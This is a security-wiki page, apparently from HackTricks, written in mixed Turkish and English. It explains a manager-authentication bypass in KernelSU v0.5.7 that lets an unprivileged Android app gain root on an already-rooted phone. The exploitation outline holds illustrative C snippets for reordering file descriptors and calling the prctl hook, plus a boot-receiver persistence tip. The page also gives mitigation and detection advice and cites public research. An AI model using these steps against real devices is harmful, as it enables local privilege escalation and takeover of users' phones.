# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU, APatch, SKRoot ve Magisk gibi rooting framework'leri Linux/Android kernel'ini sık sık patch'ler ve hook'lanmış bir syscall üzerinden ayrıcalıksız userspace "manager" uygulamasına privileged işlevler sunar. Manager-authentication adımı hatalıysa herhangi bir local app bu kanala erişebilir ve zaten root'lanmış cihazlarda privileges yükseltebilir.

Bu sayfa, hem red hem de blue team'lerin attack surface'lerini, exploitation primitive'lerini ve sağlam mitigation yöntemlerini anlamasına yardımcı olmak amacıyla public research'te (özellikle Zimperium'un KernelSU v0.5.7 analizinde) ortaya çıkarılan teknikleri ve pitfalls'leri soyutlar.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- Kernel module/patch bir syscall'ı (yaygın olarak prctl) hook'layarak userspace'ten "command" alır.
- Protocol genellikle şöyledir: magic_value, command_id, arg_ptr/len ...
- Bir userspace manager app önce authentication yapar (ör. CMD_BECOME_MANAGER). Kernel caller'ı trusted manager olarak işaretledikten sonra privileged command'ler kabul edilir:
- Caller'a root verme (ör. CMD_GRANT_ROOT)
- su için allowlist/deny-list'leri yönetme
- SELinux policy'sini ayarlama (ör. CMD_SET_SEPOLICY)
- Version/configuration sorgulama
- Her app syscall invoke edebildiği için manager authentication'ın doğruluğu critical'dır.

Example (KernelSU design):
- Hook'lanmış syscall: prctl
- KernelSU handler'a yönlendirmek için magic value: 0xDEADBEEF
- Command'ler şunları içerir: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, vb.

---
## KernelSU v0.5.7 authentication flow (as implemented)

Userspace prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) çağırdığında KernelSU şunları doğrular:

1) Path prefix check
- Sağlanan path, caller UID için beklenen prefix ile başlamalıdır; ör. /data/data/<pkg> veya /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- Path, caller UID'ye ait olmalıdır.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) FD table scan üzerinden APK signature check
- Calling process'in açık file descriptor'ları (FD'ler) iterate edilir.
- Path'i /data/app/*/base.apk ile eşleşen ilk file seçilir.
- APK v2 signature parse edilir ve official manager certificate'a karşı verify edilir.
- References: manager.c (FD'lerin iterate edilmesi), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Tüm check'ler geçerse kernel manager'ın UID'sini geçici olarak cache'ler ve reset edilene kadar o UID'den gelen privileged command'leri kabul eder.

---
## Vulnerability class: trusting “the first matching APK” from FD iteration

Signature check, process FD table'da bulunan "ilk eşleşen /data/app/*/base.apk" dosyasına bağlanıyorsa caller'ın kendi package'ını gerçekten verify etmiyor demektir. Attacker, legitimately signed bir APK'yı (gerçek manager'ın APK'sını) kendi base.apk'sından daha önce FD listesinde görünecek şekilde pre-position edebilir.

Bu trust-by-indirection, unprivileged bir app'in manager'ı, manager'ın signing key'ine sahip olmadan impersonate etmesini sağlar.<sup>[[1]](#references)</sup>

Exploited key properties:<sup>[[1]](#references)</sup>
- FD scan, caller'ın package identity'sine bind edilmez; yalnızca path string'leri pattern-match eder.
- open() en düşük kullanılabilir FD'yi döndürür. Attacker, önce daha düşük numaralı FD'leri kapatarak ordering'i kontrol edebilir.
- Filter yalnızca path'in /data/app/*/base.apk ile eşleştiğini kontrol eder; caller'ın installed package'ına karşılık gelip gelmediğini kontrol etmez.

---
## Attack preconditions

- Cihaz, vulnerable bir rooting framework ile (ör. KernelSU v0.5.7) zaten root'lanmış olmalıdır.
- Attacker local olarak arbitrary unprivileged code çalıştırabilmelidir (Android app process).
- Gerçek manager henüz authenticated olmamış olmalıdır (ör. reboot'un hemen ardından). Bazı framework'ler success sonrasında manager UID'sini cache'ler; race'i kazanmanız gerekir.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps:<sup>[[1]](#references)[[9]](#references)</sup>
1) Prefix ve ownership check'lerini karşılamak için kendi app data directory'nize geçerli bir path oluşturun.
2) Gerçek bir KernelSU Manager base.apk'sının kendi base.apk'nızdan daha düşük numaralı bir FD'de açıldığından emin olun.
3) Check'leri geçmek için prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) invoke edin.
4) Elevation'ı persist etmek için CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY gibi privileged command'leri gönderin.

Practical notes on step 2 (FD ordering):<sup>[[1]](#references)</sup>
- /proc/self/fd symlink'lerini yürüyerek kendi /data/app/*/base.apk'nız için process'inizin FD'sini belirleyin.
- Düşük numaralı bir FD'yi (ör. stdin, fd 0) kapatın ve legitimate manager APK'sını önce açarak fd 0'ı (veya kendi base.apk FD'nizden daha düşük herhangi bir index'i) almasını sağlayın.
- Legitimate manager APK'sını app'inizle birlikte bundle edin; böylece path kernel'in naive filter'ını karşılar. Örneğin, dosyayı /data/app/*/base.apk ile eşleşen bir subpath altına yerleştirin.

Example code snippets (Android/Linux, illustrative only):

Açık FD'leri enumerate ederek base.apk girdilerini locate edin:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Daha düşük numaralı bir FD'nin meşru manager APK'sını göstermesini zorlayın:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
prctl hook aracılığıyla Manager kimlik doğrulaması:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Başarılı olduktan sonra privileged commands (örnekler):
- CMD_GRANT_ROOT: mevcut process’i root’a yükseltir
- CMD_ALLOW_SU: kalıcı su için package/UID’nizi allowlist’e ekler
- CMD_SET_SEPOLICY: framework tarafından desteklendiği şekilde SELinux policy’sini ayarlar

Race/persistence ipucu:
- AndroidManifest içinde bir BOOT_COMPLETED receiver (RECEIVE_BOOT_COMPLETED) kaydederek reboot sonrasında erken başlatın ve gerçek manager’dan önce authentication gerçekleştirmeyi deneyin.<sup>[[1]](#references)</sup>

---
## Detection ve mitigation guidance

Framework geliştiricileri için:
- Authentication’ı rastgele FD’lere değil, caller’ın package/UID’sine bağlayın:
- Caller’ın package’ını UID’sinden çözümleyin ve FD taramak yerine kurulu package’ın signature’ını (PackageManager üzerinden) doğrulayın.
- Yalnızca kernel kullanılıyorsa, stable caller identity (task creds) kullanın ve process FD’leri yerine init/userspace helper tarafından yönetilen stable bir source of truth üzerinden doğrulama yapın.
- Identity olarak path-prefix kontrollerini kullanmaktan kaçının; caller bunları trivially satisfy edebilir.
- Kanal üzerinden nonce-based challenge–response kullanın ve boot sırasında veya önemli event’lerde cache’lenmiş manager identity’yi temizleyin.
- Uygun olduğunda generic syscall’leri overload etmek yerine binder-based authenticated IPC kullanmayı değerlendirin.

Defenders/blue team için:
- Rooting framework’lerinin ve manager process’lerinin varlığını tespit edin; kernel telemetry’iniz varsa şüpheli magic constant’larla (ör. 0xDEADBEEF) yapılan prctl çağrılarını izleyin.
- Managed fleet’lerde, boot sonrasında privileged manager commands’ı hızlıca denemeye başlayan untrusted package’lardan gelen boot receiver’larını engelleyin veya alert oluşturun.
- Cihazların patched framework version’larına güncellendiğinden emin olun; update sonrasında cache’lenmiş manager ID’lerini geçersiz kılın.

Attack’in limitations:
- Yalnızca vulnerable bir framework ile zaten rooted olan cihazları etkiler.
- Genellikle legitimate manager authentication gerçekleştirmeden önce bir reboot/race window gerektirir (bazı framework’ler reset edilene kadar manager UID’sini cache’ler).

---
## Framework’ler arasındaki related notes

- Password-based auth (ör. historical APatch/SKRoot builds), password’lar guessable/bruteforceable olduğunda veya validation’lar hatalı olduğunda zayıf olabilir.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth (ör. KernelSU) principle olarak daha güçlüdür; ancak FD scan gibi indirect artefact’lara değil, actual caller’a bağlanmalıdır.<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk: CVE-2024-48336 (MagiskEoP), mature ecosystem’lerin bile manager context içinde root ile code execution’a yol açan identity spoofing’e karşı savunmasız olabileceğini gösterdi.<sup>[[1]](#references)[[8]](#references)</sup>

---
## References

- [1] [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
